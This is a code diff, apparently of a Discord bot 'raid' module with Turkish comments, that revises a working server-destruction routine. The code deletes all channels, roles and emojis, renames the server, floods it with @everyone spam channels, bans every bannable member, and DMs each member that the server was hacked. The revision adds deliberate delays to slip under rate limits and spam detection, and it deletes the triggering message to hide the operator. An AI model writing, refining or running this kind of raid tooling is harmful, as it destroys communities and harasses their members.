@@ -1,80 +1,115 @@
 const configuration = require('./configuration.json');
 
-module.exports = (message) => {
-    // Komut argümanlarını al ve varsayılan değerleri ata
-    const args = message.content.toLowerCase().trim().split(/ +/g);
-    const raidName = args[1] || "Raiding"; // Kanal, rol ve mesaj içeriği için kullanılacak isim
-    const amount = parseInt(args[2]) || 50; // Oluşturulacak kanal/rol sayısı
+// İşlemler arasında beklenecek milisaniye cinsinden süre. Bu, rate limit'i önler.
+const API_DELAY_MS = 350;
 
-    // Komutu yazan kişinin mesajını silerek iz bırakma
-    message.delete().catch(err => console.log(`[HATA] Mesaj silinemedi: ${err}`));
+/**
+ * Belirtilen süre kadar bekleyen bir yardımcı fonksiyon.
+ * @param {number} ms - Beklenecek milisaniye.
+ */
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-    console.log(`RAID BAŞLATILDI: [Sunucu Adı: ${message.guild.name}, Sunucu ID: ${message.guild.id}]`);
+module.exports = async (message) => {
+    try {
+        // Komut argümanlarını al ve varsayılan değerleri ata
+        const args = message.content.toLowerCase().trim().split(/ +/g);
+        const raidName = args[1] || "Raiding";
+        const amount = parseInt(args[2]) || 50;
 
-    //? 1. Sunucu Adını ve İkonunu Değiştir
-    message.guild.setName(raidName).catch(err => console.log(`[HATA] Sunucu adı değiştirilemedi: ${err}`));
-    message.guild.setIcon(configuration.icon).catch(err => console.log(`[HATA] Sunucu ikonu değiştirilemedi: ${err}`));
+        // Komutu yazan kişinin mesajını silerek iz bırakma
+        message.delete().catch(() => {}); // Hata verirse önemseme
 
-    //? 2. Mevcut Tüm Kanalları Sil
-    console.log("Tüm kanallar siliniyor...");
-    message.guild.channels.cache.forEach((channel) => {
-        channel.delete().catch(err => console.log(`[HATA] Bir kanal silinemedi: ${err}`));
-    });
+        console.log(`[RAID BAŞLATILDI] Sunucu: ${message.guild.name} (${message.guild.id})`);
 
-    //? 3. Mevcut Tüm Rolleri Sil (Botun rolünden alttakileri)
-    console.log("Tüm roller siliniyor...");
-    message.guild.roles.cache.forEach((role) => {
-        // Botun en yüksek rolünden daha düşük pozisyondaki rolleri sil
-        if (message.guild.me.roles.highest.position > role.position && role.name !== '@everyone') {
-            role.delete("Raid").catch(err => console.log(`[HATA] Bir rol silinemedi: ${err}`));
+        //? 1. Sunucu Adını ve İkonunu Değiştir
+        console.log("[1/8] Sunucu adı ve ikonu değiştiriliyor...");
+        await message.guild.setName(raidName).catch(err => console.log(`[HATA] Sunucu adı değiştirilemedi: ${err.message}`));
+        await message.guild.setIcon(configuration.icon).catch(err => console.log(`[HATA] Sunucu ikonu değiştirilemedi: ${err.message}`));
+        
+        //? 2. Mevcut Tüm Kanalları Toplu Sil
+        console.log("[2/8] Mevcut tüm kanallar siliniyor...");
+        const channelsToDelete = Array.from(message.guild.channels.cache.values());
+        await Promise.allSettled(channelsToDelete.map(channel => 
+            channel.delete().catch(err => console.log(`[HATA] Kanal silinemedi (${channel.name}): ${err.message}`))
+        ));
+        console.log("[BAŞARILI] Kanallar silindi.");
+
+        //? 3. Mevcut Tüm Rolleri Toplu Sil
+        console.log("[3/8] Mevcut tüm roller siliniyor...");
+        const rolesToDelete = message.guild.roles.cache.filter(role => 
+            role.editable && role.name !== '@everyone' && role.position < message.guild.me.roles.highest.position
+        );
+        await Promise.allSettled(rolesToDelete.map(role => 
+            role.delete("Raid").catch(err => console.log(`[HATA] Rol silinemedi (${role.name}): ${err.message}`))
+        ));
+        console.log("[BAŞARILI] Roller silindi.");
+
+        //? 4. Mevcut Tüm Emojileri Toplu Sil
+        console.log("[4/8] Mevcut tüm emojiler siliniyor...");
+        await Promise.allSettled(message.guild.emojis.cache.map(emoji => 
+            emoji.delete("Raid").catch(err => console.log(`[HATA] Emoji silinemedi (${emoji.name}): ${err.message}`))
+        ));
+        console.log("[BAŞARILI] Emojiler silindi.");
+
+        //? 5. Belirtilen Miktarda Yeni Kanal Oluştur ve Tek Mesaj Gönder (Sıralı ve Gecikmeli)
+        console.log(`[5/8] ${amount} adet yeni kanal oluşturuluyor ve mesaj gönderiliyor...`);
+        const pingMessage = `@everyone ||**${raidName}**||`;
+        for (let i = 0; i < amount; i++) {
+            try {
+                const channel = await message.guild.channels.create(raidName, { type: 'GUILD_TEXT' });
+                await channel.send(pingMessage);
+                console.log(` -> Kanal oluşturuldu ve mesaj gönderildi: ${channel.name} (${i + 1}/${amount})`);
+            } catch (err) {
+                console.log(`[HATA] Kanal oluşturma veya mesaj gönderme başarısız: ${err.message}`);
+            }
+            await delay(API_DELAY_MS); // API limitine takılmamak için bekle
         }
-    });
+        console.log("[BAŞARILI] Kanal oluşturma ve mesaj gönderme tamamlandı.");
 
-    //? 4. Mevcut Tüm Emojileri Sil
-    console.log("Tüm emojiler siliniyor...");
-    message.guild.emojis.cache.forEach(emoji => {
-        emoji.delete({ reason: "Raid" }).catch(err => console.log(`[HATA] Bir emoji silinemedi: ${err}`));
-    });
+        //? 6. Belirtilen Miktarda Yeni Rol Oluştur (Sıralı ve Gecikmeli)
+        console.log(`[6/8] ${amount} adet yeni rol oluşturuluyor...`);
+        for (let i = 0; i < amount; i++) {
+            try {
+                await message.guild.roles.create({ name: raidName, color: 'RANDOM', reason: 'Raid' });
+                console.log(` -> Rol oluşturuldu: ${raidName} (${i + 1}/${amount})`);
+            } catch (err) {
+                console.log(`[HATA] Rol oluşturulamadı: ${err.message}`);
+            }
+            await delay(API_DELAY_MS); // API limitine takılmamak için bekle
+        }
+        console.log("[BAŞARILI] Rol oluşturma tamamlandı.");
 
-    //? 5. Belirtilen Miktarda Yeni Kanal Oluştur ve Spam Mesajları Gönder
-    console.log(`${amount} adet yeni kanal ve spam mesaj oluşturuluyor...`);
-    for (let i = 0; i < amount; i++) {
-        message.guild.channels.create(raidName, { type: 'text' })
-            .then(channel => {
-                // Her kanala belirli sayıda spam mesajı gönder
-                for (let j = 0; j < 10; j++) { // Her kanala 10 mesaj atar, sayıyı artırabilirsin
-                    channel.send(`@everyone \`\`\`${raidName}\`\`\``);
-                }
-            })
-            .catch(err => console.log(`[HATA] Kanal oluşturulamadı: ${err}`));
+        //? 7. Sunucudaki Tüm Üyeleri Yasakla (Sıralı ve Gecikmeli)
+        console.log("[7/8] Tüm üyeler yasaklanıyor...");
+        const membersToBan = Array.from(message.guild.members.cache.values()).filter(m => m.bannable);
+        let bannedCount = 0;
+        for (const member of membersToBan) {
+            await member.ban({ reason: raidName }).then(() => {
+                bannedCount++;
+                console.log(` -> Üye yasaklandı: ${member.user.tag} (${bannedCount}/${membersToBan.length})`);
+            }).catch(err => console.log(`[HATA] ${member.user.tag} yasaklanamadı: ${err.message}`));
+            await delay(API_DELAY_MS); // API limitini aşmamak için her yasaklama arasında bekle
+        }
+        console.log(`[BAŞARILI] ${bannedCount} üye yasaklandı.`);
+
+        //? 8. Tüm Üyelere Özel Mesaj Gönder (Sıralı ve ÇOK YAVAŞ Gecikmeli)
+        // DİKKAT: Bu işlem hala risklidir ve hesabınızın kısıtlanmasına neden olabilir.
+        console.log("[8/8] Tüm üyelere özel mesaj gönderiliyor (Bu işlem uzun sürebilir)...");
+        const membersToDm = Array.from(message.guild.members.cache.values()).filter(m => !m.user.bot);
+        let dmCount = 0;
+        const dmMessage = `Sunucunuz "${message.guild.name}" hacklenmiştir. Mesaj: \`\`\`${raidName}\`\`\``;
+        for (const member of membersToDm) {
+            await member.send(dmMessage).then(() => {
+                dmCount++;
+                console.log(` -> DM gönderildi: ${member.user.tag} (${dmCount}/${membersToDm.length})`);
+            }).catch(() => console.log(`[UYARI] ${member.user.tag} adlı üyeye DM gönderilemedi (DM'leri kapalı olabilir).`));
+            await delay(1000); // SPAM olarak algılanmamak için DM'ler arasında daha uzun bekle
+        }
+        console.log(`[BAŞARILI] ${dmCount} üyeye DM gönderilmeye çalışıldı.`);
+        console.log("[RAID TAMAMLANDI]");
+
+    } catch (error) {
+        console.error("[KRİTİK HATA] Raid işlemi sırasında beklenmedik bir hata oluştu:", error);
     }
-
-    //? 6. Belirtilen Miktarda Yeni Rol Oluştur
-    console.log(`${amount} adet yeni rol oluşturuluyor...`);
-    for (let i = 0; i < amount; i++) {
-        message.guild.roles.create({
-            name: raidName,
-            color: 'RANDOM', // Rastgele renk
-            reason: 'Raid'
-        }).catch(err => console.log(`[HATA] Rol oluşturulamadı: ${err}`));
-    }
-
-    //? 7. Sunucudaki Tüm Üyeleri Yasakla (Ban All Members) - YENİ ÖZELLİK
-    console.log("Tüm üyeler yasaklanıyor...");
-    message.guild.members.cache.forEach(member => {
-        // Botun kendisini ve sunucu sahibini yasaklamasını engelle
-        if (member.id !== message.client.user.id && member.bannable) {
-            member.ban({ reason: raidName }).catch(err => console.log(`[HATA] ${member.user.tag} yasaklanamadı: ${err}`));
-        }
-    });
-
-    //? 8. Tüm Üyelere Özel Mesaj Gönder (DM All Members) - YENİ ÖZELLİK
-    // DİKKAT: Bu özellik botunuzun Discord tarafından çok hızlı bir şekilde yasaklanmasına neden olabilir.
-    console.log("Tüm üyelere özel mesaj gönderiliyor...");
-    message.guild.members.cache.forEach(member => {
-        if (!member.user.bot) { // Botlara mesaj göndermeyi engelle
-            member.send(`Sunucunuz "${message.guild.name}" hacklenmiştir. Mesaj: \`\`\`${raidName}\`\`\``)
-                 .catch(err => console.log(`[HATA] ${member.user.tag} adlı üyeye DM gönderilemedi.`));
-        }
-    });
 };
+            
